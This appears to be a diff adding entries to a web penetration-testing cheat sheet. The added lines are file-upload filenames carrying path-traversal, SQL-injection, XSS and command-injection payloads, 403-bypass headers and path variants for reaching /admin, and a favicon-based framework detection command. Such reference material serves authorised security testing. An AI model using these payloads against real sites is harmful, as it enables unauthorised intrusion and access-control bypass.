@@ -235,6 +235,13 @@ PNG / JPEG: Pixel flood attack (DoS)
 ZIP: RCE via LFI / DoS
 PDF / PPTX: SSRF / BLIND XXE
 ```
+# File upload chain
+```
+../../../tmp/lol.png —> for path traversal
+sleep(10)-- -.jpg —> for SQL injection
+<svg onload=alert(document.domain)>.jpg/png —> for XSS
+; sleep 10; —> for command injections
+```
 # Find JavaScript Files in Target.com
 ```
 echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
@@ -264,6 +271,20 @@ site.com/secret/ –> HTTP 200 OK
 site.com/secret/. –> HTTP 200 OK
 site.com//secret// –> HTTP 200 OK
 site.com/./secret/.. –> HTTP 200 OK
+
+X-Original-URL: /admin
+X-Override-URL: /admin
+X-Rewrite-URL: /admin
+
+/accessible/..;/admin
+/.;/admin
+/admin;/
+/admin/~
+/./admin/./
+/admin?param
+/%2e/admin
+/admin#
+
 ```
 # Data leakage through .json
 ```
@@ -351,7 +372,10 @@ SAML Raider – SAML testing
 Upload Scanner – File upload tester
 Web Cache Deception Scanner
 ```
-
+# Detect framework via favico
+```
+cat urls.txt | python3 favfreak.py -o output
+```
 
 
 ### Misc
